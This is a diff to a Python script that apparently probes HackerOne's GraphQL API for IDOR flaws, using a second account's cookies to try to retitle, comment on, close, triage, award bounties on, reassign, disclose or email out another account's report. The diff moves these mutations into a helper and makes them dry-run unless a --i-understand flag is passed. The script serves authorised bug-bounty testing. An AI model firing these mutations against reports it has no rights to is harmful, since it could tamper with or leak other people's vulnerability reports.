@@ -93,12 +93,34 @@ def check(label: str, status: int, resp: dict) -> bool:
         print(f"  data={json.dumps(data)[:200]}")
     return finding
 
+def run_mutation(label: str, query: str, cookie_b: str, csrf_b: str, i_understand: bool, findings: list) -> None:
+    """Fire a real, state-changing mutation against Account A's report as
+    Account B — closeReport/awardBounty/requestPublicDisclosure etc. are
+    genuinely destructive against a live HackerOne report, so unlike this
+    script's read-only checks, these never fire unless the operator has
+    explicitly passed --i-understand. Default behavior prints what would be
+    sent and skips the network call entirely (dry-run)."""
+    if not i_understand:
+        print(f"\n  [DRY-RUN] Would send mutation: {label} (pass --i-understand to actually fire it)")
+        return
+    status, resp = gql(cookie_b, csrf_b, query)
+    if check(f"{label} as B", status, resp):
+        findings.append(label)
+    time.sleep(0.5)
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("--cookie-a", required=True, help="Account A full cookie string")
     parser.add_argument("--cookie-b", required=True, help="Account B full cookie string")
     parser.add_argument("--report-id", required=True, help="Numeric report ID (Account A's)")
     parser.add_argument("--report-gid", required=True, help="Base64 GID of the report")
+    parser.add_argument(
+        "--i-understand", action="store_true",
+        help="Actually fire the state-changing mutations in Phase 2/5 (updateReportTitle, "
+             "closeReport, awardBounty, requestPublicDisclosure, ...) against the real report. "
+             "Without this flag, those mutations are printed but never sent (dry-run) — "
+             "only the read-only checks in Phase 1/3/4 make real requests.",
+    )
     args = parser.parse_args()
 
     print("=" * 60)
@@ -157,104 +179,99 @@ def main():
 
     print("\n" + "=" * 60)
     print("PHASE 2: State-changing mutations as Account B")
+    if not args.i_understand:
+        print("  (dry-run — pass --i-understand to actually fire these against the live report)")
     print("=" * 60)
 
-    # updateReportTitle
-    q = f'''mutation {{
-      updateReportTitle(input: {{
-        id: "{gid}"
-        title: "TEST_IDOR_TITLE_DO_NOT_SUBMIT"
-      }}) {{
-        report {{ id title }}
-      }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("updateReportTitle as B", status, resp):
-        findings.append("updateReportTitle")
-    time.sleep(0.5)
+    run_mutation(
+        "updateReportTitle",
+        f'''mutation {{
+          updateReportTitle(input: {{
+            id: "{gid}"
+            title: "TEST_IDOR_TITLE_DO_NOT_SUBMIT"
+          }}) {{
+            report {{ id title }}
+          }}
+        }}''',
+        args.cookie_b, csrf_b, args.i_understand, findings,
+    )
 
-    # updateReportVulnerabilityInformation
-    q = f'''mutation {{
-      updateReportVulnerabilityInformation(input: {{
-        id: "{gid}"
-        vulnerability_information: "IDOR_TEST"
-      }}) {{
-        report {{ id vulnerability_information }}
-      }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("updateReportVulnerabilityInformation as B", status, resp):
-        findings.append("updateReportVulnerabilityInformation")
-    time.sleep(0.5)
+    run_mutation(
+        "updateReportVulnerabilityInformation",
+        f'''mutation {{
+          updateReportVulnerabilityInformation(input: {{
+            id: "{gid}"
+            vulnerability_information: "IDOR_TEST"
+          }}) {{
+            report {{ id vulnerability_information }}
+          }}
+        }}''',
+        args.cookie_b, csrf_b, args.i_understand, findings,
+    )
 
-    # addReportComment
-    q = f'''mutation {{
-      addReportComment(input: {{
-        report_id: "{gid}"
-        message: "IDOR_TEST_COMMENT_DO_NOT_ACCEPT"
-        internal: false
-      }}) {{
-        activity {{ ... on ActivityComment {{ message }} }}
-      }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("addReportComment as B", status, resp):
-        findings.append("addReportComment")
-    time.sleep(0.5)
+    run_mutation(
+        "addReportComment",
+        f'''mutation {{
+          addReportComment(input: {{
+            report_id: "{gid}"
+            message: "IDOR_TEST_COMMENT_DO_NOT_ACCEPT"
+            internal: false
+          }}) {{
+            activity {{ ... on ActivityComment {{ message }} }}
+          }}
+        }}''',
+        args.cookie_b, csrf_b, args.i_understand, findings,
+    )
 
-    # updateReportSeverity
-    q = f'''mutation {{
-      updateReportSeverity(input: {{
-        report_id: "{gid}"
-        rating: "critical"
-      }}) {{
-        report {{ id severity {{ rating }} }}
-      }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("updateReportSeverity as B", status, resp):
-        findings.append("updateReportSeverity")
-    time.sleep(0.5)
+    run_mutation(
+        "updateReportSeverity",
+        f'''mutation {{
+          updateReportSeverity(input: {{
+            report_id: "{gid}"
+            rating: "critical"
+          }}) {{
+            report {{ id severity {{ rating }} }}
+          }}
+        }}''',
+        args.cookie_b, csrf_b, args.i_understand, findings,
+    )
 
-    # updateReportStateToTriaged
-    q = f'''mutation {{
-      updateReportStateToTriaged(input: {{
-        id: "{gid}"
-      }}) {{
-        report {{ id state }}
-      }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("updateReportStateToTriaged as B", status, resp):
-        findings.append("updateReportStateToTriaged")
-    time.sleep(0.5)
+    run_mutation(
+        "updateReportStateToTriaged",
+        f'''mutation {{
+          updateReportStateToTriaged(input: {{
+            id: "{gid}"
+          }}) {{
+            report {{ id state }}
+          }}
+        }}''',
+        args.cookie_b, csrf_b, args.i_understand, findings,
+    )
 
-    # closeReport
-    q = f'''mutation {{
-      closeReport(input: {{
-        id: "{gid}"
-        reason: "spam"
-      }}) {{
-        report {{ id state }}
-      }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("closeReport as B", status, resp):
-        findings.append("closeReport")
-    time.sleep(0.5)
+    run_mutation(
+        "closeReport",
+        f'''mutation {{
+          closeReport(input: {{
+            id: "{gid}"
+            reason: "spam"
+          }}) {{
+            report {{ id state }}
+          }}
+        }}''',
+        args.cookie_b, csrf_b, args.i_understand, findings,
+    )
 
-    # requestPublicDisclosure
-    q = f'''mutation {{
-      requestPublicDisclosure(input: {{
-        id: "{gid}"
-      }}) {{
-        report {{ id }}
-      }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("requestPublicDisclosure as B", status, resp):
-        findings.append("requestPublicDisclosure")
-    time.sleep(0.5)
+    run_mutation(
+        "requestPublicDisclosure",
+        f'''mutation {{
+          requestPublicDisclosure(input: {{
+            id: "{gid}"
+          }}) {{
+            report {{ id }}
+          }}
+        }}''',
+        args.cookie_b, csrf_b, args.i_understand, findings,
+    )
 
     print("\n" + "=" * 60)
     print("PHASE 3: Attachment / file access as Account B")
@@ -311,52 +328,51 @@ def main():
 
     print("\n" + "=" * 60)
     print("PHASE 5: Program manager mutations as B")
+    if not args.i_understand:
+        print("  (dry-run — pass --i-understand to actually fire these against the live report)")
     print("=" * 60)
 
-    # awardBounty on A's report
-    q = f'''mutation {{
-      awardBounty(input: {{
-        report_id: "{gid}"
-        amount: 1
-        currency: "USD"
-        message: "IDOR_TEST"
-      }}) {{
-        bounty {{ amount }}
-      }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("awardBounty as B on A's report", status, resp):
-        findings.append("awardBounty")
-    time.sleep(0.5)
+    run_mutation(
+        "awardBounty as B on A's report",
+        f'''mutation {{
+          awardBounty(input: {{
+            report_id: "{gid}"
+            amount: 1
+            currency: "USD"
+            message: "IDOR_TEST"
+          }}) {{
+            bounty {{ amount }}
+          }}
+        }}''',
+        args.cookie_b, csrf_b, args.i_understand, findings,
+    )
 
-    # assignReport
-    q = f'''mutation {{
-      assignReport(input: {{
-        report_id: "{gid}"
-        assignee_id: "4378355"
-      }}) {{
-        report {{ id assignee {{ username }} }}
-      }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("assignReport as B", status, resp):
-        findings.append("assignReport")
-    time.sleep(0.5)
+    run_mutation(
+        "assignReport",
+        f'''mutation {{
+          assignReport(input: {{
+            report_id: "{gid}"
+            assignee_id: "4378355"
+          }}) {{
+            report {{ id assignee {{ username }} }}
+          }}
+        }}''',
+        args.cookie_b, csrf_b, args.i_understand, findings,
+    )
 
-    # shareReportViaEmail
-    q = f'''mutation {{
-      shareReportViaEmail(input: {{
-        id: "{gid}"
-        email: "awarexone@example.com"
-        message: "IDOR_TEST"
-      }}) {{
-        report {{ id }}
-      }}
-    }}'''
-    status, resp = gql(args.cookie_b, csrf_b, q)
-    if check("shareReportViaEmail as B", status, resp):
-        findings.append("shareReportViaEmail")
-    time.sleep(0.5)
+    run_mutation(
+        "shareReportViaEmail",
+        f'''mutation {{
+          shareReportViaEmail(input: {{
+            id: "{gid}"
+            email: "awarexone@example.com"
+            message: "IDOR_TEST"
+          }}) {{
+            report {{ id }}
+          }}
+        }}''',
+        args.cookie_b, csrf_b, args.i_understand, findings,
+    )
 
     print("\n" + "=" * 60)
     print("SUMMARY")
